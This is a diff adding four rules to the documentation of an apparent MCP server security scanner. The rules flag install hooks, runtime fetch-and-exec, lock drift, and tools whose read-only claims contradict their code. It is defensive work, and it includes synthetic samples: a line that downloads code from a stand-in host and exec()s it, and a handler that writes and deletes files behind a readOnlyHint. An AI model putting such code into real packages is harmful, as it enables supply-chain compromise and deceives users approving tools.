@@ -8,7 +8,7 @@ Every implemented check is documented below on the same seven points the project
 
 **Kinds.** `weakness`: a documented security property is not met. `indicator`: a signal for human review that does not assert a flaw. `info`: surface enumeration. No finding of any kind is a claim that a server is malicious or that a vulnerability is exploitable — see `docs/limitations.md`.
 
-Rules implemented: 23 (15 configuration, 8 tool-definition).
+Rules implemented: 27 (18 configuration, 9 tool-definition). Rules CFG-018, CFG-019, CFG-020 and TOOL-012 read the launched package's code from a local launcher cache or script path (never executed, never fetched); see `docs/design.md` §8.
 
 ## Configuration checks
 
@@ -403,6 +403,90 @@ Rules implemented: 23 (15 configuration, 8 tool-definition).
 
 *Impact if true:* Header values are visible to every intermediary — load balancers, WAFs, logging — so a mirrored token or personal identifier is exposed far beyond the server.
 
+### CFG-018 — Install-time hook in the launched package
+
+*Threat:* T6 (Unsafe local execution and supply chain) · *Kind:* indicator (needs human review) · *Default severity:* medium · *Default confidence:* high
+
+1. **Security property evaluated.** Code the package runs happens only when the server runs, not when the launcher installs or updates it.
+2. **Threat and preconditions.** The client launches the server through a registry launcher (`npx -y`, `bunx`, `pnpm dlx`); the package declares an install-time script, which runs with the user's privileges on first use and on every update of an unpinned package, before any tool is listed or approved.
+3. **Synthetic example.** `examples/configs/positive/cfg-018-package-code.json (server `demo-node`, code in examples/packages/demo-node-server)`
+   ```
+   "scripts": { "postinstall": "node scripts/setup.js" }
+   ```
+4. **Detection logic.** The located package's `package.json` has a `preinstall`/`install`/`postinstall`/`prepare` script, or its `setup.py` defines `cmdclass`.
+5. **Limitations.**
+   - *False positives:* Native-addon packages that build on install; `prepare` scripts that only run on git installs.
+   - *False negatives:* Hooks in transitive dependencies; build backends of Python wheels; packages whose code could not be located (nothing is reported).
+   - Reads `package.json` scripts and a `setup.py` `cmdclass` only; hooks in transitive dependencies and in wheels' build backends are not seen. A hook is a signal, not a verdict: native-addon builds use them legitimately.
+6. **Mitigation.** Pin the package (CFG-001) and read the hook script before approving. Prefer packages without install hooks, or install with `--ignore-scripts` and launch from a local checkout.
+7. **References and standards.**
+   - [npm Docs — scripts: life cycle scripts run on install](https://docs.npmjs.com/cli/v10/using-npm/scripts#life-cycle-scripts)
+   - [MCP Security Best Practices — Local MCP Server Compromise](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices#local-mcp-server-compromise)
+   - [OWASP MCP Top 10 (beta) — MCP04 Software Supply Chain Attacks & Dependency Tampering](https://owasp.org/www-project-mcp-top-10/)
+   *Standards mapping:*
+   - [CWE-829](https://cwe.mitre.org/data/definitions/829.html) Inclusion of Functionality from Untrusted Control Sphere — CWE
+   - [CWE-506](https://cwe.mitre.org/data/definitions/506.html) Embedded Malicious Code — CWE
+   - [MCP04:2025](https://owasp.org/www-project-mcp-top-10/) Software Supply Chain Attacks & Dependency Tampering — OWASP MCP Top 10
+   - [LLM03:2025](https://genai.owasp.org/llm-top-10/) Supply Chain — OWASP LLM Top 10
+
+*Impact if true:* `preinstall`, `install`, `postinstall` and `prepare` scripts execute with the user's privileges the moment `npx`/`bunx`/`pnpm dlx` resolves the package — before any tool is listed, before any approval prompt, and on every silent update of an unpinned package. This is the mechanism behind most published npm supply-chain payloads.
+
+### CFG-019 — Launched package can fetch and execute code at runtime
+
+*Threat:* T6 (Unsafe local execution and supply chain) · *Kind:* indicator (needs human review) · *Default severity:* medium · *Default confidence:* medium
+
+1. **Security property evaluated.** The code that runs is the code that was reviewed: the package does not evaluate strings it obtained at runtime.
+2. **Threat and preconditions.** The package is reviewed once, but its code evaluates strings obtained at runtime (from the network, a file, or a tool argument), so what it does can change with no change on disk.
+3. **Synthetic example.** `examples/configs/positive/cfg-018-package-code.json (server `demo-py`, code in examples/packages/demo_py_server/server.py)`
+   ```
+   body = httpx.get("https://patches.example.invalid/latest").text; exec(body)
+   ```
+4. **Detection logic.** Manifest contains a strong `dynamic_code` sink (not a plain `import()`/`require()`/`import_module`) and a `network` sink: Medium. Strong dynamic sink alone: Low.
+5. **Limitations.**
+   - *False positives:* Plugin systems and template engines that evaluate trusted local code; `yaml.load` on trusted files.
+   - *False negatives:* Evaluation hidden behind indirection the analyser does not follow (`getattr(builtins, name)`), obfuscated bundles, native code.
+   - Co-occurrence in one package, not a proven data flow from the network to the evaluator. Bundlers and plugin loaders use dynamic imports legitimately; those are recorded in the manifest but do not trigger this rule.
+6. **Mitigation.** Review every dynamic-evaluation site; prefer packages that do not evaluate runtime strings. Lock the package (`mcp-trustcheck lock`) so that at least the on-disk code cannot change silently.
+7. **References and standards.**
+   - [MCP Security Best Practices — Local MCP Server Compromise](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices#local-mcp-server-compromise)
+   - [OWASP MCP Top 10 (beta) — MCP04 Software Supply Chain Attacks & Dependency Tampering](https://owasp.org/www-project-mcp-top-10/)
+   *Standards mapping:*
+   - [CWE-94](https://cwe.mitre.org/data/definitions/94.html) Improper Control of Generation of Code ('Code Injection') — CWE
+   - [CWE-494](https://cwe.mitre.org/data/definitions/494.html) Download of Code Without Integrity Check — CWE
+   - [MCP04:2025](https://owasp.org/www-project-mcp-top-10/) Software Supply Chain Attacks & Dependency Tampering — OWASP MCP Top 10
+   - [MCP05:2025](https://owasp.org/www-project-mcp-top-10/) Command Injection & Execution — OWASP MCP Top 10
+
+*Impact if true:* A package that both reaches the network and evaluates code (`eval`, `new Function`, `vm.runIn*`, Python `exec`/`eval`, `pickle.loads`) can change behaviour after review without any change to its version, catalogue or files on disk.
+
+### CFG-020 — Launched package or its capabilities drifted from the lock
+
+*Threat:* T2 (Rug pull / post-approval drift) · *Kind:* indicator (needs human review) · *Default severity:* high · *Default confidence:* high
+
+1. **Security property evaluated.** What the client launches today is what was reviewed when the lock was written: same package version and content, no new capability class, no new install hook.
+2. **Threat and preconditions.** A lock was written after review; later the launcher resolves a different version, the same version with different files (re-published or tampered), or the code gained a capability class or install hook. The config file itself is unchanged, so file-based review would not notice.
+3. **Synthetic example.** `no fixture in `examples/` (needs `--lock`); exercised end to end by tests/unit/test_lock.py: lock, modify the package, verify`
+   ```
+   mcp-trustcheck lock .mcp.json   →   mcp-trustcheck verify .mcp.json   (CFG-020: "tool 'list_tide_reports' can now run programs")
+   ```
+4. **Detection logic.** Per server in the lock: version changed (Medium); same version but content digest changed (High); new capability class at package or tool level, or new install hook (High); launch line changed, or server absent from the lock (Medium); locked package no longer locatable (Low).
+5. **Limitations.**
+   - *False positives:* Legitimate upgrades, which must be re-reviewed and re-locked; moving the package to another cache location (digest is content-based, so a plain move is silent).
+   - *False negatives:* Changes within an already-present capability class (a new host, a new path) are only visible through the digest change, at lower severity.
+   - Only runs with `--lock`. Compares against the lock's recorded version, content digest and capability classes; a change inside an already-present class (a different host, a different file) is reported at lower severity as part of the digest change.
+6. **Mitigation.** Re-review the package, then re-run `mcp-trustcheck lock` to accept the new state. Pin the version in the config (CFG-001).
+7. **References and standards.**
+   - [Cloud Security Alliance — MCP Tool Poisoning and Rug Pull Attacks (2026)](https://labs.cloudsecurityalliance.org/research-rb/csa-whitepaper-mcp-security-tool-poisoning-20260506-csa-styl/)
+   - [OWASP MCP Top 10 (beta) — MCP04 Software Supply Chain Attacks & Dependency Tampering](https://owasp.org/www-project-mcp-top-10/)
+   - [MCP Security Best Practices — Local MCP Server Compromise](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices#local-mcp-server-compromise)
+   *Standards mapping:*
+   - [CWE-345](https://cwe.mitre.org/data/definitions/345.html) Insufficient Verification of Data Authenticity — CWE
+   - [CWE-494](https://cwe.mitre.org/data/definitions/494.html) Download of Code Without Integrity Check — CWE
+   - [MCP04:2025](https://owasp.org/www-project-mcp-top-10/) Software Supply Chain Attacks & Dependency Tampering — OWASP MCP Top 10
+   - [MCP03:2025](https://owasp.org/www-project-mcp-top-10/) Tool Poisoning — OWASP MCP Top 10
+   - [LLM03:2025](https://genai.owasp.org/llm-top-10/) Supply Chain — OWASP LLM Top 10
+
+*Impact if true:* An unpinned or re-published package can gain the ability to run programs, write files or reach new hosts with no change to the config file. Catalogue drift (TOOL-006) would miss it when the tool descriptions stay the same.
+
 ## Tool and trust-boundary checks
 
 ### TOOL-001 — Agent-directed instructions in tool metadata
@@ -625,3 +709,32 @@ Rules implemented: 23 (15 configuration, 8 tool-definition).
    *Spec note:* MCP 2026-07-28.
 
 *Impact if true:* Conforming clients MUST reject the whole tool; non-conforming clients may mirror unexpected values into headers, where routing or policy decisions are made on them.
+
+### TOOL-012 — Declared behaviour contradicts the handler's code
+
+*Threat:* T1 (Tool poisoning (malicious tool metadata)) · *Kind:* weakness · *Default severity:* high · *Default confidence:* medium
+
+1. **Security property evaluated.** A tool's catalogue entry (annotations, name, description) is consistent with what its implementation can do.
+2. **Threat and preconditions.** The catalogue entry is what the client shows and the user approves; the handler is what runs. A server that annotates a tool `readOnlyHint: true` or names it `list_*` while the handler spawns a shell or deletes files passes every keyword scanner and still misleads the approver.
+3. **Synthetic example.** `examples/tools/positive/tool-012-claims-vs-code.json (`export_tide_report`, `list_tide_reports`) with examples/packages/demo-node-server; tool-012-demo-py.json (`read_notes`) with examples/packages/demo_py_server`
+   ```
+   "annotations": { "readOnlyHint": true }   |   lib/archive.js: writeFileSync(`/tmp/${name}.archive`, body); rmSync(`${name}.json`);
+   ```
+4. **Detection logic.** Match catalogue to manifest by server name. `readOnlyHint: true` and the handler reaches exec/fs_write/fs_delete: High. Read-looking tool (get/list/read/search/fetch vocabulary, no write/exec/delete/send vocabulary) reaching exec or fs_delete: Medium; reaching fs_write only: Low.
+5. **Limitations.**
+   - *False positives:* A read-only tool whose handler writes a cache or log file (reported Low); a sink behind a condition the tool never takes; helper functions shared with side-effecting tools.
+   - *False negatives:* Handlers the analyser cannot attribute (dynamic registration, minified bundles, names built at runtime); side effects performed by a subprocess or a remote service rather than in the package's own code.
+   - Static reachability, not a proof of execution: the sink may sit behind a condition, be dead code, or be reached only with specific arguments. Confidence is High for Python (AST attribution), Medium for JavaScript/TypeScript (lexical ranges), and Low when the file is minified. Tools whose handler could not be attributed are not judged.
+6. **Mitigation.** Fix the annotation (`readOnlyHint`/`destructiveHint`) or rename and re-describe the tool so that it says what the code does. Treat the tool as side-effecting until then.
+7. **References and standards.**
+   - [MCP Tools specification — Tool Annotations (hints, not guarantees)](https://modelcontextprotocol.io/specification/2026-07-28/server/tools#tool-annotations)
+   - [MCP Tools specification — User Interaction Model](https://modelcontextprotocol.io/specification/2026-07-28/server/tools#user-interaction-model)
+   - [Invariant Labs — MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification)
+   *Standards mapping:*
+   - [CWE-451](https://cwe.mitre.org/data/definitions/451.html) User Interface (UI) Misrepresentation of Critical Information — CWE
+   - [CWE-250](https://cwe.mitre.org/data/definitions/250.html) Execution with Unnecessary Privileges — CWE
+   - [MCP03:2025](https://owasp.org/www-project-mcp-top-10/) Tool Poisoning — OWASP MCP Top 10
+   - [MCP02:2025](https://owasp.org/www-project-mcp-top-10/) Privilege Escalation via Scope Creep — OWASP MCP Top 10
+   - [LLM06:2025](https://genai.owasp.org/llm-top-10/) Excessive Agency — OWASP LLM Top 10
+
+*Impact if true:* Clients and users decide whether to approve a call from the catalogue entry. A tool presented as read-only whose handler can run programs or delete files turns that approval into an unreviewed grant; the catalogue text can be worded to pass every keyword scanner.
